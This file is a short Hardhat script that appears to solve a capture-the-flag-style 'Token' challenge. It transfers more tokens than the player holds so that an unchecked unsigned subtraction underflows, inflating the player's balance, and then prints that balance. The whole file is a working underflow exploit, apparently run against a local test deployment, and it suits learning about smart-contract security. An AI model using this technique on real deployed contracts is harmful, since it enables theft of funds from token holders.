import { ethers } from "hardhat";

async function main(){
    // random player address
    let player = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
    // token contract address
    let address_a = "0x0DCd1Bf9A1b36cE34237eEaFef220932846BCD82";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Token", address_a, signer);

    // starting with 20 tokens, we transfer 21 tokens to get integer overflow, since 20 subtract 21 in the domain of uint returns a very large number
    await contract_a.transfer("0xa513E6E4b8f2a923D98304ec87F64353C4D5C853",21);

    // check that our wallet has indeed a large number of tokens
    let balance = await contract_a.balanceOf(player);
    console.log(balance);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
